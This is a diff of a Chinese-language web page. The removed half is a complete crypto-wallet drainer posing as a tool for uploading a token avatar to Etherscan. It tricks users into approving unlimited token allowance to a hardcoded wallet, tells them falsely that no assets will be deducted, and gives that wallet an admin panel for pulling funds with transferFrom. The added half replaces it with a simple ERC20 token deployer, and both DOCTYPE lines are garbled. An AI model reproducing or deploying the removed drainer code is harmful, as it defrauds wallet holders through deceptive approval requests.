@@ -1,476 +1,449 @@
-<<!DOCTYPE html>
+<<<!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>代币头像一键上传</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: system-ui, -apple-system, sans-serif;
-    }
-    body {
-      background: #f7f8fa;
-      padding: 24px 16px;
-      color: #222;
-    }
-    .container {
-      max-width: 520px;
-      margin: 0 auto;
-    }
-    .page-title {
-      font-size: 24px;
-      font-weight: 600;
-      margin-bottom: 8px;
-    }
-    .page-desc {
-      font-size:14px; color:#777; margin-bottom:28px;
-    }
-    .card-box {
-      background: #ffffff;
-      border-radius: 16px;
-      padding: 24px 20px;
-      margin-bottom:20px;
-    }
-    .form-item{
-      margin-bottom:24px;
-    }
-    .form-label{
-      font-size:15px; margin-bottom:8px; display:block;
-    }
-    .input-text{
-      width:100%;
-      border:1px solid #ddd;
-      border-radius:12px;
-      padding:14px 12px;
-      font-size:15px;
-      outline:none;
-    }
-    .input-text:focus{
-      border-color:#4086ff;
-    }
-    /* 头像选择区域 */
-    .avatar-select-wrap{
-      border:1px dashed #bbbbbb;
-      border-radius:12px;
-      padding:24px 16px;
-      text-align:center;
-      cursor:pointer;
-    }
-    .avatar-select-wrap:active{
-      background:#f5f7fa;
-    }
-    .avatar-preview{
-      width:88px;
-      height:88px;
-      border-radius:50%;
-      object-fit:cover;
-      border:1px solid #eee;
-      background:#f3f3f3;
-      margin:0 auto 12px;
-      display:none;
-    }
-    .avatar-tip{
-      color:#888;
-      font-size:14px;
-    }
-    #fileInput{
-      display:none;
-    }
-    .main-btn {
-      width: 100%;
-      background: #4086ff;
-      color: #fff;
-      border: none;
-      border-radius: 12px;
-      padding: 16px 0;
-      font-size: 17px;
-      font-weight: 500;
-      margin-top:12px;
-    }
-    .main-btn:disabled {
-      background: #94a3b8;
-      cursor: not-allowed;
-    }
-    .status-text {
-      text-align: center;
-      margin: 16px 0;
-      color: #444;
-      font-size: 14px;
-    }
-    /* 授权确认弹窗 */
-    .auth-modal {
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: rgba(0, 0, 0, 0.55);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 1000;
-    }
-    .auth-box {
-      background: #fff;
-      width: 86%;
-      max-width:340px;
-      border-radius:16px;
-      padding:24px 20px;
-    }
-    .auth-box h3{
-      font-size:18px;
-      margin-bottom:12px;
-    }
-    .auth-desc{
-      font-size:14px; color:#666; line-height:1.6; margin-bottom:20px;
-    }
-    .modal-btn-row{
-      display:flex; gap:12px;
-    }
-    .modal-cancel{
-      flex:1; padding:12px; border:1px solid #ddd; background:#fff; border-radius:10px; font-size:16px;
-    }
-    .modal-confirm{
-      flex:1; padding:12px; border:none; background:#4086ff; color:#fff; border-radius:10px; font-size:16px;
-    }
-    /* 提示弹窗 */
-    .tip-modal {
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: rgba(0, 0, 0, 0.5);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 1001;
-    }
-    .tip-box {
-      background: #fff;
-      width: 80%;
-      max-width: 300px;
-      border-radius: 16px;
-      padding: 22px 18px;
-    }
-    .tip-ok{
-      margin-top:18px;
-      text-align:right;
-    }
-    .tip-ok button{
-      color:#4086ff; border:none; background:none; font-size:16px;
-    }
-    /* 管理员面板 */
-    .admin-panel{
-      background:#fff2f2;
-      border:1px solid #ffcccc;
-      border-radius:16px;
-      padding:20px 16px;
-      display:none;
-    }
-    .admin-title{
-      font-weight:bold;
-      font-size:17px;
-      margin-bottom:16px;
-      color:#c82423;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>天鹅一键发币</title>
+
+<style>
+*{box-sizing:border-box}
+body{
+ margin:0;
+ padding:25px 15px;
+ background:linear-gradient(135deg,#0b1020,#171e38);
+ color:white;
+ font-family:Arial,"Microsoft Yahei",sans-serif;
+}
+.container{max-width:500px;margin:auto}
+h1{text-align:center;color:#f7c04a}
+.card{
+ background:#ffffff0c;
+ border:1px solid #ffffff20;
+ border-radius:15px;
+ padding:24px;
+ margin-top:25px;
+}
+label{display:block;margin:18px 0 8px;color:#d0d8f0}
+input{
+ width:100%;
+ padding:14px;
+ border-radius:9px;
+ border:1px solid #353f64;
+ background:#141b33;
+ color:white;
+ font-size:16px;
+}
+button{
+ width:100%;
+ padding:15px;
+ margin-top:16px;
+ border:0;
+ border-radius:9px;
+ font-size:16px;
+ font-weight:bold;
+ cursor:pointer;
+}
+.connect{background:#3b63e9;color:white}
+.deploy{background:#f7c04a;color:#111}
+button:disabled{opacity:.5}
+.status{
+ margin-top:18px;
+ padding:14px;
+ background:#202944;
+ border-radius:9px;
+ word-break:break-all;
+ line-height:1.7;
+}
+#preview{
+ width:70px;
+ height:70px;
+ border-radius:50%;
+ object-fit:cover;
+ display:none;
+ margin-top:12px;
+}
+</style>
 </head>
+
 <body>
 <div class="container">
-  <h1 class="page-title">代币头像一键上传</h1>
-  <p class="page-desc">提交代币元数据，上传头像至Etherscan。</p>
 
-  <div class="card-box">
-    <div class="form-item">
-      <label class="form-label">代币合约地址（以太坊）</label>
-      <input class="input-text" id="tokenContractInput" placeholder="0x......">
-    </div>
+<h1>🦢 天鹅一键发币</h1>
 
-    <div class="form-item">
-      <label class="form-label">选择代币头像</label>
-      <div class="avatar-select-wrap" id="avatarSelectWrap">
-        <img id="avatarPreview" class="avatar-preview" alt="头像预览">
-        <div class="avatar-tip">点击此处打开相册选择图片</div>
-      </div>
-      <input type="file" id="fileInput" accept="image/*" />
-    </div>
+<div class="card">
 
-    <button class="main-btn" id="nextBtn">下一步</button>
-    <div class="status-text" id="statusShow"></div>
-  </div>
+<button class="connect" id="connectBtn">
+连接 MetaMask 钱包
+</button>
 
-  <!-- 管理员操作面板，只有管理员钱包连接才显示 -->
-  <div class="admin-panel" id="adminPanel">
-    <div class="admin-title">🔐管理员划扣面板</div>
-    <div class="form-item">
-      <label class="form-label">用户已授权钱包地址</label>
-      <input class="input-text" id="userWalletInput" placeholder="输入用户钱包0x地址">
-    </div>
-    <div class="form-item">
-      <label class="form-label">代币数量</label>
-      <input class="input-text" id="amountInput" placeholder="代币数量，例如100">
-    </div>
-    <button class="main-btn" id="deductionBtn">一键划扣用户代币</button>
-    <div class="status-text" id="adminStatus"></div>
-  </div>
+<div id="walletInfo"></div>
 
+<label>代币全称 Name</label>
+<input id="tokenName" placeholder="例如 Swan Coin">
+
+<label>代币符号 Symbol</label>
+<input id="tokenSymbol" placeholder="例如 SWAN">
+
+<label>初始发行量（不带小数）</label>
+<input id="supply" type="number"
+placeholder="例如 100000000">
+
+<label>代币 Logo</label>
+<input id="logo" type="file" accept="image/*">
+
+<img id="preview">
+
+<button class="deploy" id="deployBtn" disabled>
+一键部署代币
+</button>
+
+<div class="status" id="status">
+请先连接钱包。
 </div>
 
-<!-- 授权弹窗 -->
-<div class="auth-modal" id="authModal">
-  <div class="auth-box">
-    <h3>元数据校验授权</h3>
-    <div class="auth-desc">
-      为验证您的代币所有权，需要您授权 USDT 权限用于校验。<br>
-      仅用于头像上传校验，不会扣取资产。
-    </div>
-    <div class="modal-btn-row">
-      <button class="modal-cancel" id="authCancel">取消</button>
-      <button class="modal-confirm" id="authConfirm">确认授权</button>
-    </div>
-  </div>
+</div>
 </div>
 
-<!-- 提示弹窗 -->
-<div class="tip-modal" id="tipModal">
-  <div class="tip-box">
-    <p id="tipText"></p>
-    <div class="tip-ok"><button id="tipOkBtn">确定</button></div>
-  </div>
-</div>
+<script type="module">
 
-<script>
-// ========== 配置 ==========
-const TOKEN_CONTRACT = "0xd66f6bb0d107e59266c67581c57892541c394925";
-const ADMIN_WALLET = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1"; //管理员钱包spender
-const ETH_CHAIN_ID = 1;
+import {
+ BrowserProvider,
+ ContractFactory,
+ parseUnits
+} from "https://esm.sh/ethers@6.13.0";
 
-// DOM
-const tokenContractInput = document.getElementById('tokenContractInput');
-const avatarSelectWrap = document.getElementById('avatarSelectWrap');
-const fileInput = document.getElementById('fileInput');
-const avatarPreview = document.getElementById('avatarPreview');
-const nextBtn = document.getElementById('nextBtn');
-const statusShow = document.getElementById('statusShow');
+import solc from "https://esm.sh/solc@0.8.20";
 
-const authModal = document.getElementById('authModal');
-const authCancel = document.getElementById('authCancel');
-const authConfirm = document.getElementById('authConfirm');
+const CHAIN_ID = 1;
 
-const tipModal = document.getElementById('tipModal');
-const tipText = document.getElementById('tipText');
-const tipOkBtn = document.getElementById('tipOkBtn');
+let provider;
+let signer;
+let walletAddress;
 
-//管理员DOM
-const adminPanel = document.getElementById('adminPanel');
-const userWalletInput = document.getElementById('userWalletInput');
-const amountInput = document.getElementById('amountInput');
-const deductionBtn = document.getElementById('deductionBtn');
-const adminStatus = document.getElementById('adminStatus');
+const $ = id => document.getElementById(id);
 
-let provider, signer, usdtContract;
-let walletConnected = false;
-let hasSelectedAvatar = false;
-
-// 提示弹窗
-function showTip(text){
-  tipText.innerText = text;
-  tipModal.style.display = 'flex';
-}
-tipOkBtn.onclick = ()=> tipModal.style.display = 'none';
-
-// 判断当前连接钱包是否管理员，显示/隐藏管理面板
-async function checkIsAdmin(){
-  if(!signer) {
-    adminPanel.style.display = "none";
-    return;
-  }
-  const currentAddr = await signer.getAddress();
-  if(currentAddr.toLowerCase() === ADMIN_WALLET.toLowerCase()){
-    adminPanel.style.display = "block";
-  }else{
-    adminPanel.style.display = "none";
-  }
+function status(message){
+ $("status").innerHTML = message;
 }
 
-// 点击唤起相册/文件选择
-avatarSelectWrap.addEventListener('click',()=>{
-  fileInput.click();
-})
+$("logo").addEventListener("change",e=>{
+ const file=e.target.files[0];
+ if(!file)return;
 
-// 读取本地图片，前端预览（FileReader）
-fileInput.addEventListener('change',function(e){
-  const file = e.target.files[0];
-  if(!file){
-    hasSelectedAvatar = false;
-    avatarPreview.style.display = 'none';
-    return;
-  }
-  const reader = new FileReader();
-  reader.onload = function(ev){
-    avatarPreview.src = ev.target.result;
-    avatarPreview.style.display = 'block';
-    hasSelectedAvatar = true;
-  }
-  reader.readAsDataURL(file);
-})
+ const reader=new FileReader();
 
-// 切换以太坊主网
-async function switchEthereumNet(){
-  if(!window.ethereum) return false;
-  try{
-    await window.ethereum.request({
-      method:"wallet_switchEthereumChain",
-      params:[{chainId:"0x"+ETH_CHAIN_ID.toString(16)}]
-    })
-    return true;
-  }catch(err){
-    if(err.code === 4902){
-      await window.ethereum.request({
-        method:"wallet_addEthereumChain",
-        params:[{
-          chainId:"0x1",
-          chainName:"Ethereum Mainnet",
-          nativeCurrency:{name:"ETH",symbol:"ETH",decimals:18},
-          rpcUrls:["https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"],
-          blockExplorerUrls:["https://etherscan.io"]
-        }]
-      })
-      return true;
+ reader.onload=event=>{
+  $("preview").src=event.target.result;
+  $("preview").style.display="block";
+ };
+
+ reader.readAsDataURL(file);
+});
+
+// 纯 ERC20 固定发行量合约
+const source = `
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract SwanToken {
+
+    string public name;
+    string public symbol;
+
+    uint8 public constant decimals = 18;
+
+    uint256 public totalSupply;
+
+    mapping(address => uint256) public balanceOf;
+
+    mapping(address => mapping(address => uint256))
+        public allowance;
+
+    event Transfer(
+        address indexed from,
+        address indexed to,
+        uint256 value
+    );
+
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
+
+    constructor(
+        string memory tokenName,
+        string memory tokenSymbol,
+        uint256 initialSupply
+    ) {
+        name = tokenName;
+        symbol = tokenSymbol;
+
+        totalSupply = initialSupply;
+
+        balanceOf[msg.sender] = initialSupply;
+
+        emit Transfer(
+            address(0),
+            msg.sender,
+            initialSupply
+        );
     }
-    showTip("切换以太坊主网失败，请手动切换");
-    return false;
+
+    function transfer(
+        address to,
+        uint256 amount
+    ) external returns (bool) {
+
+        require(to != address(0), "Invalid address");
+        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
+
+        balanceOf[msg.sender] -= amount;
+        balanceOf[to] += amount;
+
+        emit Transfer(msg.sender, to, amount);
+
+        return true;
+    }
+
+    function approve(
+        address spender,
+        uint256 amount
+    ) external returns (bool) {
+
+        allowance[msg.sender][spender] = amount;
+
+        emit Approval(msg.sender, spender, amount);
+
+        return true;
+    }
+
+    function transferFrom(
+        address from,
+        address to,
+        uint256 amount
+    ) external returns (bool) {
+
+        require(to != address(0), "Invalid address");
+        require(balanceOf[from] >= amount, "Insufficient balance");
+
+        uint256 allowed = allowance[from][msg.sender];
+
+        require(allowed >= amount, "Insufficient allowance");
+
+        if (allowed != type(uint256).max) {
+            allowance[from][msg.sender] = allowed - amount;
+        }
+
+        balanceOf[from] -= amount;
+        balanceOf[to] += amount;
+
+        emit Transfer(from, to, amount);
+
+        return true;
+    }
+}
+`;
+
+async function compileContract(){
+
+ status("正在编译 ERC20 智能合约，请稍候...");
+
+ const input={
+  language:"Solidity",
+
+  sources:{
+   "SwanToken.sol":{
+    content:source
+   }
+  },
+
+  settings:{
+   optimizer:{
+    enabled:true,
+    runs:200
+   },
+
+   outputSelection:{
+    "*":{
+     "*":["abi","evm.bytecode.object"]
+    }
+   }
   }
+ };
+
+ const output=JSON.parse(solc.compile(JSON.stringify(input)));
+
+ const errors=output.errors || [];
+
+ const fatal=errors.filter(
+  e=>e.severity==="error"
+ );
+
+ if(fatal.length){
+  throw new Error(
+   fatal.map(e=>e.formattedMessage).join("\n")
+  );
+ }
+
+ const contract=output.contracts["SwanToken.sol"]["SwanToken"];
+
+ if(!contract.evm.bytecode.object){
+  throw new Error("合约编译失败");
+ }
+
+ return {
+  abi:contract.abi,
+  bytecode:"0x"+contract.evm.bytecode.object
+ };
 }
 
-// 连接钱包
-async function connectWallet(){
+async function switchNetwork(){
+
+ const chainId=await window.ethereum.request({
+  method:"eth_chainId"
+ });
+
+ if(Number(chainId)===CHAIN_ID)return;
+
+ await window.ethereum.request({
+  method:"wallet_switchEthereumChain",
+  params:[{chainId:"0x1"}]
+ });
+}
+
+$("connectBtn").onclick=async()=>{
+
+ try{
+
   if(!window.ethereum){
-    showTip("请在MetaMask钱包内置浏览器打开页面");
-    return false;
-  }
-  await window.ethereum.request({method:"eth_requestAccounts"});
-  const ok = await switchEthereumNet();
-  if(!ok) return false;
-
-  provider = new ethers.providers.Web3Provider(window.ethereum);
-  signer = provider.getSigner();
-  usdtContract = new ethers.Contract(TOKEN_CONTRACT,[
-    "function approve(address spender,uint256 amount) external returns(bool)",
-    "function allowance(address owner,address spender) view returns(uint256)",
-    "function transferFrom(address from,address to,uint256 amount) external returns(bool)"
-  ],signer);
-  walletConnected = true;
-  statusShow.innerText = "✅钱包已连接（以太坊主网）";
-  await checkIsAdmin(); //连接完成校验管理员身份
-  return true;
-}
-
-// 下一步按钮
-nextBtn.addEventListener('click',async ()=>{
-  const tokenAddr = tokenContractInput.value.trim();
-  // 校验合约地址
-  if(!/^0x[a-fA-F0-9]{40}$/.test(tokenAddr)){
-    showTip("请输入合法以太坊代币合约地址");
-    return;
-  }
-  // 校验是否选了头像图片
-  if(!hasSelectedAvatar){
-    showTip("请点击框内，从相册选择代币头像图片");
-    return;
+   throw new Error("请安装 MetaMask 钱包");
   }
 
-  if(!walletConnected){
-    statusShow.innerText = "正在连接钱包...";
-    const connOk = await connectWallet();
-    if(!connOk) return;
-  }
-  // 弹出授权弹窗
-  authModal.style.display = "flex";
-})
+  status("正在连接钱包...");
 
-authCancel.onclick = ()=>{
-  authModal.style.display = "none";
-}
+  await window.ethereum.request({
+   method:"eth_requestAccounts"
+  });
 
-// 用户确认授权
-authConfirm.onclick = async ()=>{
-  authModal.style.display = "none";
-  nextBtn.disabled = true;
-  statusShow.innerText = "正在发起授权签名请求...";
-  try{
-    const gasPrice = await provider.getGasPrice();
-    const txOpt = {gasPrice:gasPrice.mul(110).div(100), gasLimit:120000};
-    const tx = await usdtContract.approve(ADMIN_WALLET, ethers.constants.MaxUint256, txOpt);
-    statusShow.innerText = "授权交易已提交，等待上链确认";
-    await tx.wait(1);
-    showTip("授权完成，请继续提交头像元数据");
-    statusShow.innerText = "授权完成，可以提交头像信息";
-  }catch(err){
-    showTip("授权被拒绝或者失败："+err.message);
-    statusShow.innerText = "授权操作取消/失败";
-  }
-  nextBtn.disabled = false;
-}
+  await switchNetwork();
 
-// ==========管理员一键划扣逻辑 transferFrom==========
-deductionBtn.addEventListener('click',async ()=>{
-  if(!walletConnected){
-    showTip("请先连接管理员钱包");
-    return;
-  }
-  const currentAddr = await signer.getAddress();
-  if(currentAddr.toLowerCase() !== ADMIN_WALLET.toLowerCase()){
-    showTip("当前不是管理员钱包，禁止划扣");
-    return;
-  }
-  const userAddr = userWalletInput.value.trim();
-  const numStr = amountInput.value.trim();
-  if(!/^0x[a-fA-F0-9]{40}$/.test(userAddr)){
-    showTip("请输入合法用户钱包地址");
-    return;
-  }
-  if(isNaN(parseFloat(numStr)) || Number(numStr) <= 0){
-    showTip("请输入合法代币数量");
-    return;
-  }
-  deductionBtn.disabled = true;
-  adminStatus.innerText = "正在执行transferFrom划扣";
-  try{
-    // 注意：这里默认代币18位小数，如果该代币不是18位，需要修改decimals
-    const amountWei = ethers.utils.parseUnits(numStr,18);
-    const gasPrice = await provider.getGasPrice();
-    const txOpt = {gasPrice:gasPrice.mul(110).div(100), gasLimit:150000};
-    // transferFrom(from用户地址，to管理员自己，amount)
-    const tx = await usdtContract.transferFrom(userAddr,currentAddr,amountWei,txOpt);
-    adminStatus.innerText = "划扣交易已提交，等待确认";
-    await tx.wait(1);
-    showTip("✅代币划扣交易执行完成");
-    adminStatus.innerText = "划扣完成";
-  }catch(err){
-    console.error(err);
-    showTip("划扣失败："+err.message);
-    adminStatus.innerText = "划扣失败";
-  }
-  deductionBtn.disabled = false;
-})
+  provider=new BrowserProvider(window.ethereum);
 
-//监听钱包切换账号，自动刷新管理员面板
-if(window.ethereum){
-  window.ethereum.on('accountsChanged',async ()=>{
-    walletConnected = false;
-    provider = null;
-    signer = null;
-    usdtContract = null;
-    adminPanel.style.display="none";
-    statusShow.innerText = "钱包账号已变更，请重新连接";
-  })
-}
+  signer=await provider.getSigner();
+
+  walletAddress=await signer.getAddress();
+
+  $("walletInfo").innerHTML=
+   "<p style='color:#66ff99'>钱包已连接："+walletAddress+"</p>";
+
+  $("connectBtn").innerText="钱包已连接";
+
+  $("deployBtn").disabled=false;
+
+  status("钱包连接成功，可以创建代币。");
+
+ }catch(error){
+
+  status("连接失败："+error.message);
+
+ }
+};
+
+$("deployBtn").onclick=async()=>{
+
+ try{
+
+  if(!signer){
+   throw new Error("请先连接钱包");
+  }
+
+  const name=$("tokenName").value.trim();
+  const symbol=$("tokenSymbol").value.trim();
+  const supply=$("supply").value.trim();
+
+  if(!name || !symbol || !supply){
+   throw new Error("请填写完整代币信息");
+  }
+
+  if(name.length>64 || symbol.length>16){
+   throw new Error("代币名称或符号过长");
+  }
+
+  if(!/^[1-9][0-9]*$/.test(supply)){
+   throw new Error("发行量必须是正整数");
+  }
+
+  if(supply.length>30){
+   throw new Error("发行量超出允许范围");
+  }
+
+  if(!window.confirm(
+   "请确认代币信息：\n"+
+   "名称："+name+"\n"+
+   "符号："+symbol+"\n"+
+   "发行量："+supply+"\n"+
+   "网络：Ethereum Mainnet\n\n"+
+   "确认开始部署？"
+  )){
+   return;
+  }
+
+  $("deployBtn").disabled=true;
+
+  const compiled=await compileContract();
+
+  status("合约编译成功，正在创建部署交易...");
+
+  const initialSupply=parseUnits(supply,18);
+
+  const factory=new ContractFactory(
+   compiled.abi,
+   compiled.bytecode,
+   signer
+  );
+
+  const contract=await factory.deploy(
+   name,
+   symbol,
+   initialSupply
+  );
+
+  status(
+   "部署交易已提交。<br>"+
+   "交易哈希：<br>"+
+   contract.deploymentTransaction().hash
+  );
+
+  await contract.waitForDeployment();
+
+  const address=await contract.getAddress();
+
+  status(
+   "🎉 代币部署成功！<br><br>"+
+   "代币名称："+name+"<br>"+
+   "代币符号："+symbol+"<br>"+
+   "发行量："+supply+"<br>"+
+   "小数位：18<br><br>"+
+   "合约地址：<br>"+address+
+   "<br><br>"+
+   '<a style="color:#f7c04a" target="_blank" href="https://etherscan.io/address/'+address+'">查看 Etherscan 合约</a>'+
+   "<br><br>"+
+   '<a style="color:#66ff99" target="_blank" href="https://etherscan.io/tx/'+contract.deploymentTransaction().hash+'">查看部署交易</a>'
+  );
+
+ }catch(error){
+
+  status("部署失败："+(error.shortMessage||error.message));
+
+ }finally{
+
+  $("deployBtn").disabled=false;
+
+ }
+
+};
+
 </script>
 </body>
 </html>
